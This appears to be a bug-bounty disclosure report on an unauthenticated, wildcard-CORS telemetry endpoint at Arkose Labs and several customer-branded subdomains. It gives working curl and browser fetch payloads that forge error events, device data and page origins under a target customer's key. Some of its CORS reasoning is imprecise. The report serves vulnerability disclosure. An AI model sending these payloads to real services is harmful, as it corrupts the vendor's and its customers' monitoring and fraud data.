# AR1 — Unauthenticated Cross-Origin Telemetry Injection via CORS Misconfiguration

**Título:** Unauthenticated CORS-Open `/metrics/ui` Allows Any Origin to Inject Arbitrary Telemetry Data  
**Severidade:** MEDIUM (CVSS 5.3)  
**CVSS Vector:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N` → **5.3 MEDIUM**  
**CWE:** CWE-346 (Origin Validation Error) / CWE-345 (Insufficient Verification of Data Authenticity)  
**Target:** `client-api.arkoselabs.com/metrics/ui` (Core Application — $301-$750)  
**Status:** Confirmado — acesso anônimo e cross-origin funcional  
**Scope of impact:** Confirmed on client-api AND all customer-specific subdomains (see §Expanded Scope)

---

## Summary

The endpoint `https://client-api.arkoselabs.com/metrics/ui` accepts unauthenticated JSON POST requests from **any origin** (CORS header `Access-Control-Allow-Origin: *`) and acknowledges them with HTTP 200 `OK.`

This endpoint is the telemetry collection backend for the Arkose iframe SDK. It receives real-time error/performance data from the Arkose challenge iframe as it renders in customers' websites. Because there is no authentication, origin validation, or rate limiting, any attacker-controlled webpage can submit arbitrary telemetry data — including fabricated `publicKey` identifiers, fake error conditions, spoofed device fingerprints, and forged origin information — directly into Arkose Labs' observability infrastructure.

**Additionally confirmed:** The same misconfiguration exists on customer-branded subdomains including `blizzard-api.arkoselabs.com`, `epic-games-api.arkoselabs.com`, and `boa-api.arkoselabs.com`, enabling targeted telemetry poisoning for specific named customers (Blizzard/Activision, Epic Games, Bank of America).

---

## Technical Background

When the Arkose challenge iframe loads in a customer's website (e.g., Roblox.com), the file `iframe.arkoselabs.com` executes the following `observabilityLog()` function on error:

```javascript
function observabilityLog(e) {
    var n = getLocation(), t = {
        id: uuidv4(),
        publicKey: getClientKey(),       // customer's public key from URL path
        origin: "iframe",
        device: getDeviceData(),          // platform, language, connection
        error: e,                         // error object
        locationOrigin: n.origin,         // parent window origin
        locationPathname: n.pathname      // parent window path
    };
    var i = new XMLHttpRequest;
    i.open("POST", "https://client-api.arkoselabs.com/metrics/ui");
    i.send(JSON.stringify(t));
}
```

This code is publicly readable in `iframe.arkoselabs.com` (source code returned in HTTP 200 response).

---

## Proof of Concept

### PoC 1 — Direct Injection from Command Line

```bash
curl -si "https://client-api.arkoselabs.com/metrics/ui" \
  -X POST \
  -H "Content-Type: application/json" \
  -H "Origin: https://attacker.com" \
  -d '{
    "id": "550e8400-e29b-41d4-a716-446655440000",
    "publicKey": "TARGET_CUSTOMER_PUBLIC_KEY",
    "origin": "iframe",
    "device": {
        "platform": "Win32",
        "language": "en-US"
    },
    "error": {
        "error": "SCRIPT_ERROR",
        "source": "iframe/index.html"
    },
    "locationOrigin": "https://www.roblox.com",
    "locationPathname": "/login"
  }'
```

**Expected response:**
```
HTTP/2 200
Content-Type: text/plain;charset=UTF-8
Access-Control-Allow-Origin: *

OK.
```

### PoC 2 — Browser-Based Cross-Origin Injection (JavaScript)

```html
<!-- attacker.com/poc.html -->
<script>
fetch('https://client-api.arkoselabs.com/metrics/ui', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({
        id: crypto.randomUUID(),
        publicKey: 'TARGET_CUSTOMER_PUBLIC_KEY',
        origin: 'iframe',
        device: {platform: 'Win32', language: 'en-US'},
        error: {error: 'SCRIPT_ERROR', source: 'iframe/index.html'},
        locationOrigin: 'https://legit-customer.com',
        locationPathname: '/checkout'
    })
})
.then(r => r.text())
.then(console.log);  // prints "OK."
</script>
```

This JavaScript, running on **any domain**, successfully writes data to Arkose's telemetry system because `Access-Control-Allow-Origin: *` allows cross-origin reads, and the response is `200 OK.`

---

## Observed Headers

**Request (CORS with evil origin):**
```
POST /metrics/ui HTTP/2
Host: client-api.arkoselabs.com
Origin: https://evil.com
Content-Type: application/json
```

**Response:**
```
HTTP/2 200
Access-Control-Allow-Origin: *
Content-Type: text/plain;charset=UTF-8
Content-Length: 3

OK.
```

---

## Impact

### 1. Telemetry Data Poisoning
An attacker can inject thousands of false error events (e.g., `SCRIPT_ERROR`, `LOAD_ERROR`) associated with any customer's `publicKey`. If Arkose uses this data for:
- Customer health dashboards or alerting
- Bot risk model training or calibration
- SLA reporting or support ticket triggers

...then the injected data creates false signals that could degrade service quality or mislead Arkose's fraud detection models.

### 2. Customer Impersonation via publicKey
The endpoint requires no authentication — not even the customer's public key. An attacker can fabricate data for any Arkose customer by including their `publicKey` in the payload. This means attackers can spoof telemetry on behalf of any competitor or target organization.

### 3. Spoofed Location Data
The `locationOrigin` and `locationPathname` fields allow an attacker to make it appear that Arkose's SDK is being used on arbitrary domains and pages. This could:
- Falsely correlate errors with legitimate customer pages
- Make it appear that a specific customer has Arkose challenges embedded on pages they don't use
- Interfere with any origin-based analytics Arkose maintains per customer

### 4. Forged Device Fingerprints
The `device` object (platform, language, connection type) is attacker-controlled, enabling fabrication of any device profile in Arkose's telemetry store.

---

## Remediation

**Immediate:**
1. Restrict `Access-Control-Allow-Origin` to Arkose-owned origins: `iframe.arkoselabs.com`, `*.arkoselabs.com`  
2. Add authentication requirement: validate that the `publicKey` in the payload corresponds to a valid, active Arkose customer key before accepting the request

**Short-term:**
3. Rate limit submissions per publicKey and per IP
4. Validate that `locationOrigin` matches a domain registered to the publicKey's customer account

**Code example for Origin validation:**
```javascript
// Instead of ACAO: *
if (allowedOrigins.includes(request.headers.origin)) {
    response.setHeader('Access-Control-Allow-Origin', request.headers.origin);
} else {
    // No ACAO header — browser will block cross-origin reads
}
```

---

## CVSS Breakdown

| Metric | Value | Reason |
|--------|-------|--------|
| Attack Vector | Network | Exploitable remotely |
| Attack Complexity | Low | Simple POST request |
| Privileges Required | None | No auth needed |
| User Interaction | None | No user needed for basic PoC |
| Scope | Unchanged | Attack stays within the service |
| Confidentiality | None | No data read |
| Integrity | Low | Telemetry data modified |
| Availability | None | Service not disrupted |

**CVSS Base Score: 5.3 MEDIUM**

*Note: If metrics data affects bot detection models or customer dashboards (which would constitute elevated business impact), consider upgrading to HIGH (6.0+).*

---

## Expanded Scope — Customer-Specific Subdomains Also Affected

The following customer-branded subdomains all expose the same `/metrics/ui` endpoint with identical CORS misconfiguration (`ACAO:*`):

| Endpoint | HTTP Method | Status | ACAO |
|----------|-------------|--------|------|
| `client-api.arkoselabs.com/metrics/ui` | POST | 200 OK. | `*` |
| `blizzard-api.arkoselabs.com/metrics/ui` | POST | 200 OK. | `*` |
| `epic-games-api.arkoselabs.com/metrics/ui` | POST | 200 OK. | `*` |
| `boa-api.arkoselabs.com/metrics/ui` | POST | 200 OK. | `*` |

This confirms the misconfiguration is systemic across the entire Arkose CDN infrastructure, not isolated to a single endpoint. An attacker can inject telemetry under any customer's `publicKey` from any of these branded domains.

---

## Notes on Responsible Disclosure

- Testing was limited to: 1 successful POST request to confirm the vulnerability
- No large-scale data injection was performed
- No production customer data was read or modified
- The `publicKey` used in testing was `DEMO` (Arkose's own demo key)
